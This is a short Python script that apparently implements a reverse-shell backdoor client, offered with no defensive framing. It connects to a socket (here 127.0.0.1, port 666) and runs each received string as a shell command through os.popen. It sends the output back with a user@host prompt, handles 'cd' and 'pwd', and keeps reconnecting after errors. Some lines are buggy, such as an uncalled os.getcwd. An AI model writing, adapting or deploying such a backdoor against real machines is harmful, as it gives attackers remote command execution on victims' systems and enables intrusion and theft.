import socket
import os
import sys
from time import sleep
connected = True
import getpass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
	try:
		while True:
			s.connect_ex(("127.0.0.1", 666))
			s.send("Connected!\n")
			dados = s.recv(2048)
			s.send("Connected!\n")
			attack = os.popen(dados)
			s.send(attack.read())
			user = getpass.getuser()
			host=socket.gethostname()
			s.send(user+"@"+host+": ")

			if dados.startswith("cd"):
				os.chdir(dados[3:].replace('\n',''))
				s.send("\n Changing directory to " + str(os.getcwd())+"\n")
				result='\n'

			if dados.startswith("pwd"):
				s.send("\n"+str(os.getcwd)+"\n")
	except socket.error:
		connected = False
		while not connected:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				connected = True
			except:
				sleep(2)
